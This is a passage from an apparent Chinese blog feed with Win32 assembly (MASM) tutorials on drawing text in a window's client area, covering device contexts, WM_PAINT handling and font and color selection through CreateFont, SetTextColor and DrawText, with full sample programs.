就足够了。在调用该函数后会返回所创建的字体的句柄，然后把该句柄选进“设备环境”使其成为当前字体，随后所有的“绘制”文本串的函数在被调用时都要把该句柄作为一个参数传递 </p><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">include gdi32.inc</span><br><span class="line">includelib gdi32.lib</span><br><span class="line"></span><br><span class="line">RGB macro red,green,blue</span><br><span class="line">xor eax,eax</span><br><span class="line">mov ah,blue</span><br><span class="line">shl eax,8</span><br><span class="line">mov ah,green</span><br><span class="line">mov al,red</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0</span><br><span class="line">AppName   db &quot;Our Third Window&quot;,0</span><br><span class="line">TestString db &quot;Win32 汇编非常有意思&quot;,0</span><br><span class="line">FontName db &quot;script&quot;,0</span><br><span class="line"></span><br><span class="line">.data?</span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke GetModuleHandle,NULL</span><br><span class="line">mov    hInstance,eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov    CommandLine,eax</span><br><span class="line">invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">    .WHILE TRUE </span><br><span class="line">        invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">        .BREAK .IF (!eax) </span><br><span class="line">        invoke TranslateMessage, ADDR msg </span><br><span class="line">        invoke DispatchMessage, ADDR msg </span><br><span class="line">    .ENDW </span><br><span class="line">    mov     eax,msg.wParam </span><br><span class="line">    ret </span><br><span class="line">WinMain endp</span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</span><br><span class="line">    </span><br><span class="line">    LOCAL hdc:HDC</span><br><span class="line">    LOCAL ps:PAINTSTRUCT</span><br><span class="line">    LOCAL hfont:HFONT</span><br><span class="line">    </span><br><span class="line">    .IF uMsg==WM_DESTROY</span><br><span class="line">        invoke PostQuitMessage,NULL</span><br><span class="line">    .ELSEIF uMsg==WM_PAINT</span><br><span class="line">        invoke BeginPaint,hWnd,ADDR ps</span><br><span class="line">        mov    hdc,eax</span><br><span class="line">        invoke CreateFont,24,16,0,0,400,0,0,0,OEM_CHARSET,\</span><br><span class="line">                            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,\</span><br><span class="line">                            DEFAULT_QUALITY,DEFAULT_PITCH or FF_SCRIPT,\</span><br><span class="line">                            ADDR FontName </span><br><span class="line">        invoke SelectObject,hdc,eax</span><br><span class="line">        mov    hfont,eax</span><br><span class="line">        RGB    200,200,50</span><br><span class="line">        invoke SetTextColor,hdc,eax</span><br><span class="line">        RGB    0,0,255</span><br><span class="line">        invoke SetBkColor,hdc,eax</span><br><span class="line">        invoke TextOut,hdc,0,0,ADDR TestString,SIZEOF TestString</span><br><span class="line">        invoke SelectObject,hdc,hfont</span><br><span class="line">        invoke EndPaint,hWnd,ADDR ps</span><br><span class="line">    .ELSE</span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">        ret</span><br><span class="line">    .endif</span><br><span class="line">    xor eax,eax</span><br><span class="line">    ret</span><br><span class="line">WndProc endp</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p><code>CreateFont</code> 函数产生一种逻辑字体，它尽可能地接近参数中指定的各相关值。这个函数大概是所有 Windows API 函数中所带参数最多的一个。它返回一个指向逻辑字体的句柄供调用 <code>SelectObject</code> 函数使用。下面我们详细讲解该函数的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CreateFont proto \</span><br><span class="line">nHeight：DWORD，\</span><br><span class="line">nWidth：DWORD，\</span><br><span class="line">nEscapement：DWORD，\</span><br><span class="line">nOrientation：DWORD，\</span><br><span class="line">nWeight：DWORD，\ </span><br><span class="line">cItalic：DWORD，\ </span><br><span class="line">cUnderline：DWORD，\</span><br><span class="line">cStrikeOut：DWORD，\</span><br><span class="line">cCharSet：DWORD，\</span><br><span class="line">cOutputPrecision：DWORD，\</span><br><span class="line">cClipPrecision：DWORD，\</span><br><span class="line">cQuality：DWORD，\</span><br><span class="line">cPitchAndFamily：DWORD，\</span><br><span class="line">lpFacename：DWORD</span><br></pre></td></tr></table></figure><ul><li><code>nHeight</code>： 希望使用的字体的高度，0为缺省。</li><li><code>nWidth</code>： 希望使用的字体的宽度，一般情况下最好用0， 这样 Windows 将会自动为您选择一个和高度匹配的值。因为在我们的例子中那样做的话会使得字符因太小而无法显示，所以我们设定它为16。</li><li><code>nEscapement</code>： 每一个字符相对前一个字符的旋转角度，一般设成0。900代表转90度，1800转190度，2700转270度。</li><li><code>nOrientation</code>： 字体的方向。</li><li><code>nWeight</code>： 字体笔画的粗细。</li></ul><p>Windows 为我们预定义了如下值： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FW_DONTCARE 等于 0</span><br><span class="line">FW_THIN 等于 100</span><br><span class="line">FW_EXTRALIGHT 等于 200</span><br><span class="line">FW_ULTRALIGHT 等于 200</span><br><span class="line">FW_LIGHT 等于 300</span><br><span class="line">FW_NORMAL 等于 400</span><br><span class="line">FW_REGULAR 等于 400</span><br><span class="line">FW_MEDIUM 等于 500</span><br><span class="line">FW_SEMIBOLD 等于 600</span><br><span class="line">FW_DEMIBOLD 等于 600</span><br><span class="line">FW_BOLD 等于 700</span><br><span class="line">FW_EXTRABOLD 等于 800</span><br><span class="line">FW_ULTRABOLD 等于 800</span><br><span class="line">FW_HEAVY 等于 900</span><br><span class="line">FW_BLACK 等于 900</span><br></pre></td></tr></table></figure><ul><li><code>cItalic</code>： 0为正常，其它值为斜体。 </li><li><code>cUnderline</code>： 0为正常，其它值为有下划线。</li><li><code>cStrikeOut</code>： 0为正常，其它值为删除线。</li><li><code>cCharSet</code>： 字体的字符集。一般选择OEM_CHARSET，它使得 Windows 会选用和操作系统相关的字符集。</li><li><code>cOutputPrecision</code>： 指定我们选择的字体接近真实字体的精度。 一般选用OUT_DEFAULT_PRECIS，它决定了缺省的映射方式。</li><li><code>cClipPrecision</code>： 指定我们选择的字体在超出裁剪区域时的裁剪精度。 一般选用CLIP_DEFAULT_PRECIS，它决定了裁剪精度。</li><li><code>cQuality</code>： 指定输出字体的质量。它指出GDI应如何尽可能的接近真实 字体，一共有三种方式：DEFAULT_QUALITY， PROOF_QUALITY 和DRAFT_QUALITY。</li><li><code>cPitchAndFamily</code>：字型和字体家族。</li><li><code>lpFacename</code>： 指定字体的名称。 </li></ul><p>上面的描述不一定好理解，您如果要的到更多的信息，应参考 WIN32 API 指南。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke SelectObject， hdc， eax</span><br><span class="line">mov hfont，eax</span><br></pre></td></tr></table></figure><p>在我们得到了指向逻辑字体的句柄后必须调用 <code>SelectObject</code> 函数把它选择进“设备环境”，我们还可以调用该函数把诸如此类的像颜色、笔、画刷 等GDI对象选进“设备环境”。该函数会返回一个旧的“设备环境”的句柄。您必须保存该句柄，以便在完成“绘制”工作后再把它选回。在调用 <code>SelectObject</code> 函数后一切的绘制函数都是针对该“设备环境”的。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RGB 200，200，50</span><br><span class="line">invoke SetTextColor，hdc，eax</span><br><span class="line">RGB 0，0，255 </span><br><span class="line">invoke SetBkColor，hdc，eax</span><br></pre></td></tr></table></figure><p>我们用宏 RGB 产生颜色，然后分别调用 <code>SetTextColor</code> 和 <code>SetBkColor</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke TextOut，hdc，0，0，ADDR TestString，SIZEOF TestString</span><br></pre></td></tr></table></figure><p>我们调用 <code>TextOut</code> 在客户区用我们前面选定的字体和颜色“绘制”文本串。 <code>TextOut,hdc,x,y,lpString,nCount</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke SelectObject，hdc， hfont</span><br></pre></td></tr></table></figure><p>在我们“绘制”完成后，必须恢复“设备环境”。</p><h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo9dl4zzhsj20u00hk0sw.jpg" alt="绘制有颜色的文本"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将学习有关文本的诸多属性如字体和颜色等。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(4)：绘制文本</title>
    <link href="http://hacktech.cn/2018/02/07/Win32-ASM-4-draw-text.html"/>
    <id>http://hacktech.cn/2018/02/07/Win32-ASM-4-draw-text.html</id>
    <published>2018-02-07T09:11:25.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p>这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><h3 id="“绘制”字符串"><a href="#“绘制”字符串" class="headerlink" title="“绘制”字符串"></a>“绘制”字符串</h3><p>Windows 中的文本是一个GUI（图形用户界面）对象。每一个字符实际上是由许多的像素点组成，这些点在有笔画的地方显示出来，这样就会出现字符。这也是为什么我说“绘制”字符，而不是写字符。通常您都是在您应用程序的客户区“绘制”字符串（尽管您也可以在客户区外“绘制”）。Windows 下的“绘制”字符串方法和 Dos 下的截然不同，在 Dos 下，您可以把屏幕想象成 85 x 25 的一个平面，而 Windows 下由于屏幕上同时有几个应用程序的画面，所以您必须严格遵从规范。Windows 通过把每一个应用程序限制在他的客户区来做到这一点。当然客户区的大小是可变的，您随时可以调整。</p><p>在您在客户区“绘制”字符串前，您必须从 Windows 那里得到您客户区的大小，确实您无法像在 DOS 下那样随心所欲地在屏幕上任何地方“绘制”，绘制前您必须得到 Windows 的允许，然后 Windows 会告诉您客户区的大小，字体，颜色和其它 GUI 对象的属性。您可以用这些来在客户区“绘制”。</p><h3 id="设备环境"><a href="#设备环境" class="headerlink" title="设备环境"></a>设备环境</h3><p>什么是“设备环境”（DC）呢？ 它其实是由 Windows 内部维护的一个数据结构。一个“设备环境”和一个特定的设备相连。像打印机和显示器。对于显示器来说，“设备环境”和一个个特定的窗口相连。</p><p>“设备环境”中的有些属性和绘图有关，像：颜色，字体等。您可以随时改动那些缺省值，之所以保存缺省值是为了方便。您可以把“设备环境”想象成是Windows 为您准备的一个绘图环境，而您可以随时根据需要改变某些缺省属性。</p><p>当应用程序需要绘制时，您必须得到一个“设备环境”的句柄。通常有几种方法。</p><ul><li>在 <code>WM_PAINT</code> 消息中使用 <code>call BeginPaint</code></li><li>在其他消息中使用 <code>call GetDC</code></li><li><code>call CreateDC</code> 建立你自己的 DC</li></ul><p>您必须牢记的是，<strong>在处理单个消息后你必须释放“设备环境”句柄</strong>。不要在一个消息处理中获得 “设备环境”句柄，而在另一个消息处理中在释放它。</p><p>我们在Windows 发送 <code>WM_PAINT</code> 消息时处理绘制客户区，Windows 不会保存客户区的内容，它用的是方法是“重绘”机制（譬如当客户区刚被另一个应用程序的客户区覆盖），Windows 会把 <code>WM_PAINT</code> 消息放入该应用程序的消息队列。重绘窗口的客户区是各个窗口自己的责任，您要做的是在窗口过程处理 WM_PAINT 的部分知道绘制什么和何如绘制。 </p><p>您必须了解的另一个概念是“无效区域”。Windows 把一个最小的需要重绘的正方形区域叫做“无效区域”。当 Windows 发现了一个”无效区域“后，它就会向该应用程序发送一个 <code>WM_PAINT</code> 消息，在 <code>WM_PAINT</code> 的处理过程中，窗口首先得到一个有关绘图的结构体，里面包括无效区的坐标位置等。您可以通过调用 <code>BeginPaint</code> 让“无效区”有效，<strong>如果您不处理 <code>WM_PAINT</code> 消息，至少要调用缺省的窗口处理函数 <code>DefWindowProc</code> ，或者调用 <code>ValidateRect</code> 让“无效区”有效。否则您的应用程序将会收到无穷无尽的 <code>WM_PAINT</code> 消息。</strong></p><p>下面是响应该消息的步骤： </p><ol><li>取得“设备环境”句柄 </li><li>绘制客户区 </li><li>释放“设备环境”句柄 </li></ol><p>注意，您无须显式地让“无效区”有效，这个动作由 <code>BeginPaint</code> 自动完成。您可以在 <code>BeginPaint</code> 和 <code>Endpaint</code> 之间，调用所有的绘制函数。几乎所有的 GDI 函数都需要“设备环境”的句柄作为参数。</p><h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>我们将写一个应用程序，它会在客户区的中心显示一行 “Win32 汇编非常有意思”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line"></span><br><span class="line">.DATA </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0 </span><br><span class="line">AppName  db &quot;Our Second Window&quot;,0 </span><br><span class="line">OurText  db &quot;Win32 汇编非常有意思&quot;,0 </span><br><span class="line"></span><br><span class="line">.DATA? </span><br><span class="line">hInstance HINSTANCE ? </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line"></span><br><span class="line">.CODE </span><br><span class="line">start: </span><br><span class="line">    invoke GetModuleHandle, NULL </span><br><span class="line">    mov    hInstance,eax </span><br><span class="line">    invoke GetCommandLine</span><br><span class="line">    mov CommandLine,eax</span><br><span class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </span><br><span class="line">    invoke ExitProcess,eax </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">        .WHILE TRUE </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke TranslateMessage, ADDR msg </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">        .ENDW </span><br><span class="line">        mov     eax,msg.wParam </span><br><span class="line">        ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    LOCAL hdc:HDC </span><br><span class="line">    LOCAL ps:PAINTSTRUCT </span><br><span class="line">    LOCAL rect:RECT </span><br><span class="line">    .IF uMsg==WM_DESTROY </span><br><span class="line">        invoke PostQuitMessage,NULL </span><br><span class="line">    .ELSEIF uMsg==WM_PAINT </span><br><span class="line">        invoke BeginPaint,hWnd, ADDR ps </span><br><span class="line">        mov    hdc,eax </span><br><span class="line">        invoke GetClientRect,hWnd, ADDR rect </span><br><span class="line">        invoke DrawText, hdc,ADDR OurText,-1, ADDR rect, \ </span><br><span class="line">                DT_SINGLELINE or DT_CENTER or DT_VCENTER </span><br><span class="line">        invoke EndPaint,hWnd, ADDR ps </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor   eax, eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>这里的大多数代码和<code>Win32汇编学习(3)：简单的窗口</code>中的一样。我只解释其中一些不相同的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOCAL hdc：HDC</span><br><span class="line">LOCAL ps：PAINTSTRUCT</span><br><span class="line">LOCAL rect：RECT</span><br></pre></td></tr></table></figure><p>这些局部变量由处理 <code>WM_PAINT</code> 消息中的 GDI 函数调用。<code>hdc</code> 用来存放调用 <code>BeginPaint</code> 返回的“设备环境”句柄。<code>ps</code> 是一个 <code>PAINTSTRUCT</code> 数据类型的变量。通常您不会用到其中的许多值，它由 Windows 传递给 <code>BeginPaint</code>，在结束绘制后再原封不动的传递给 <code>EndPaint</code>。<code>rect</code> 是一个 <code>RECT</code> 结构体类型参数，它的定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RECT Struct left LONG ?</span><br><span class="line">top LONG ?</span><br><span class="line">right LONG ?</span><br><span class="line">bottom LONG ?</span><br><span class="line">RECT ends</span><br></pre></td></tr></table></figure><p>left 和 top 是正方形左上角的坐标。right 和 bottom 是正方形右下角的坐标。客户区的左上角的坐标是 x=0，y=0，这样对于 x=0，y=10 的坐标点就在它的下面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">invoke BeginPaint，hWnd， ADDR ps</span><br><span class="line">mov hdc，eax</span><br><span class="line">invoke GetClientRect，hWnd， ADDR rect</span><br><span class="line">invoke DrawText， hdc，ADDR OurText，-1， ADDR rect， \ </span><br><span class="line">DT_SINGLELINE or DT_CENTER or DT_VCENTER</span><br><span class="line">invoke EndPaint，hWnd， ADDR ps</span><br></pre></td></tr></table></figure><p>在处理 <code>WM_PAINT</code> 消息时，您调用<code>BeginPaint</code>函数，传给它一个窗口句柄和未初始化的 <code>PAINTSTRUCT</code> 型参数。调用成功后在 eax 中返回“设备环境”的句柄。下一次，调用 <code>GetClientRect</code> 以得到客户区的大小，大小放在 <code>rect</code> 中，然后把它传给 <code>DrawText</code>。<code>DrawText</code> 的语法如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DrawText proto hdc：HDC， lpString：DWORD， nCount：DWORD， lpRect：DWORD， uFormat：DWORD</span><br></pre></td></tr></table></figure><p><code>DrawText</code>是一个高层的调用函数。它能自动处理像换行、把文本放到客户区中间等这些杂事。所以您只管集中精力“绘制”字符串就可以了。让我们来看一看该函数的参数： </p><ul><li><code>hdc</code>： “设备环境”的句柄。 </li><li><code>lpString</code>：要显示的文本串，该文本串要么以NULL结尾，要么在nCount中指出它的长短。 </li><li><code>nCount</code>：要输出的文本的长度。若以NULL结尾，该参数必须是-1。 </li><li><code>lpRect</code>： 指向要输出文本串的正方形区域的指针，该方形必须是一个裁剪区，也就是说超过该区域的字符将不能显示。 </li><li><code>uFormat</code>：指定如何显示。我们可以用 or 把以下标志或到一块： <ul><li>DT_SINGLELINE：是否单行显示。 </li><li>DT_CENTER：是否水平居中。 </li><li>DT_VCENTER ：是否垂直居中。 </li></ul></li></ul><p>结束绘制后，必须调用 <code>EndPaint</code> 释放“设备环境”的句柄。 好了，现在我们把“绘制”文本串的要点总结如下：</p><ol><li>必须在开始和结束处分别调用 <code>BeginPaint</code> 和 <code>EndPaint</code>； </li><li>在 <code>BeginPaint</code> 和 <code>EndPaint</code> 之间调用所有的绘制函数； </li><li>如果在其它的消息处理中重新绘制客户区，您可以有两种选择：<ul><li>用<code>GetDC</code>和<code>ReleaseDC</code>代替<code>BeginPaint</code>和<code>EndPaint</code>；</li><li>调用<code>InvalidateRect</code>或<code>UpdateWindow</code>让客户区无效，这将迫使WINDOWS把<code>WM_PAINT</code>放入应用程序消息队列，从而使得客户区重绘。</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。&lt;br&gt;
    
    </summary>
    
